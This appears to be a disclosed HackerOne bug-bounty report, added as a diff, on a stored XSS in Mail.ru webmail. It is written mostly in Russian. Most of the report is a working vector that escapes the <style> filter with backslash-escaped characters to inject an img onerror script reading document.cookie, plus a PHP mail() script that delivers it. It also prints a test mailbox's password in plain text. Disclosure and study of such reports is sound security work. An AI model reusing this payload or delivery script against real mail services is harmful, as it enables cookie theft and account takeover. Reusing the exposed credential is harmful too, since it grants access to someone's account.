@@ -1,0 +1,52 @@
+ReportLink:https://hackerone.com/reports/269458
+WeaknessName:Cross-site Scripting (XSS) - Stored
+Reporter:https://hackerone.com/maxarr
+ReportedTo:Mail.ru(mailru)
+BountyAmount:2000.0
+Severity:high
+State:Closed
+DateOfDisclosure:26.01.2018 14:20:12
+
+Summary:
+It was possible to bypass XSS filter on the block CSS (<style>) parser via crafted escaping
+
+2 different independent bugs were identified.
+Здравствуйте!
+XSS срабатывает на e.mail.ru, m.mail.ru, light.mail.ru и в мобильном приложении.
+Уязвимость присутствует в параметрах стилей, в <style>{...здесь...}</style> 
+срабатывает, если экранировать символы.
+
+Рабочий вектор (здесь одиночные бэкслэш, в примере ещё ниже хостинг обрезал до одиночных):
+
+
+<style>
+#i\{\<\/\s\t\y\le\>\<\i\m\g\20\o\ne\r\r\o\r\=\"a\le\r\t\(d\oc\u\me\nt\.c\o\o\kie\)\"\s\rc\=\'eeeeeee\'\20\>{
+}
+</style>
+
+
+Отправка письма осуществляется php скриптом, функцией mail()<br>
+Пример:
+
+<?php
+$from = "test_xss <xss_in@body.style.ru>";
+$hs = "From: $from\r\n";
+$hs .= "Content-type: text/html; charset=UTF-8\r\n";
+if(mail("hackerone.one@mail.ru", "subj", "<style>
+#i\\{\\<\\/\\s\\t\\y\\le\\>\\<\\i\\m\\g\\20\\o\\ne\\r\\r\\o\\r\\=\\'a\\le\\r\\t\\(d\\oc\\u\\me\\nt\\.c\\o\\o\\kie\\)\\'\\s\\rc\\=\\'eeeeeee\\'\\20\\>{
+}
+</style>
+text", $hs)){
+echo "good";
+}
+?>
+
+
+Срабатывает xss не в каждой почте, но из пяти моих ящиков, сработало в трёх. 
+Предполагаю, вы вносите изменения в систему :)
+На одном из ящиков, то срабатывает, то через +/- час нет.
+Тестил в ящике: cloud.mail-ru@mail.ru, пароль: ItsHackNewton
+В приложенном видео вывод cookie и файл php для отправки, т.к в данном тикете тоже экранирует двойные бэкслэши.
+Поиск уязвимости производился вручную, без использования программ. 
+
+С уважением, Максим.
